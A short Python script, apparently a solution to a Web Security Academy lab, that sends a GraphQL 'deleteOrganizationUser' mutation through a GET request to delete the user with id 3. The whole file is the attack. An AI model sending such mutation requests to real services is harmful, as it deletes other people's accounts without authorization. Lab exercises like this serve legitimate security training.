import requests

BASE_URL = "https://0ad1004c03a71da080aa122400e500dc.web-security-academy.net/api"

query = """mutation {
  deleteOrganizationUser(
    input: {
      id: 3
    }
  ) {
    user {
      id
      username
    }
  }
}
"""

response = requests.get(
    BASE_URL,
    params={
        "query": query
    }
)

print(response.text)